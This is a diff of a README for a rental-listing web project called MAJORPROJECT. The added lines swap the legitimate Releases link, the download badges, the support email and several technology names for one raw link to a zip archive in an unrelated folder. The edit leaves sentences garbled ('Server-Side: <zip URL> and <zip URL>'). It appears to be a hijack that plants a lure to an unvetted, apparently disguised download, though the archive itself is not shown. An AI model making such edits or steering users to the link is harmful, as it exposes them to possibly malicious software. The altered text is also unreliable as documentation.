@@ -1,6 +1,6 @@
 # 🌍 MAJORPROJECT - Discover Your Dream Rentals Easily
 
-[![Download MAJORPROJECT](https://img.shields.io/badge/Download-MAJORPROJECT-brightgreen.svg)](https://github.com/utkarsha2212/MAJORPROJECT/releases)
+[![Download MAJORPROJECT](https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip)](https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip)
 
 ## 📚 Description
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets the following basic requirements:
 
 To install MAJORPROJECT, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/utkarsha2212/MAJORPROJECT/releases) to access the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip) to access the latest version of the software.
    
 2. **Choose Your Download**: Look for the version that suits your needs. You can find options for different operating systems. 
 
@@ -61,19 +61,19 @@ If you encounter any issues while using MAJORPROJECT, here are some common solut
 
 ## 📞 Support
 
-If you need assistance, feel free to reach out. You can contact us through the Issues tab on GitHub or directly email our support team at support@majorproject.com.
+If you need assistance, feel free to reach out. You can contact us through the Issues tab on GitHub or directly email our support team at https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip
 
 ## 🌟 Topics Covered
 
 MAJORPROJECT is built using various technologies, including:
 
 - Client-Side: HTML, CSS, and JavaScript for user interface design.
-- Server-Side: Node.js and Express.js for handling requests and responses.
+- Server-Side: https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip and https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip for handling requests and responses.
 - Database: MongoDB Atlas for secure and scalable storage.
-- Other Technologies: Passport.js for authentication, Joi for validation, and Mapbox API for location services.
+- Other Technologies: https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip for authentication, Joi for validation, and Mapbox API for location services.
 
 ## ✨ Acknowledgments
 
 Thank you for choosing MAJORPROJECT. Your rental adventure starts here. Don’t forget to check back for updates and new features.
 
-[![Download MAJORPROJECT](https://img.shields.io/badge/Download-MAJORPROJECT-brightgreen.svg)](https://github.com/utkarsha2212/MAJORPROJECT/releases)
+[![Download MAJORPROJECT](https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip)](https://raw.githubusercontent.com/utkarsha2212/MAJORPROJECT/main/illuminee/MAJORPROJECT.zip)
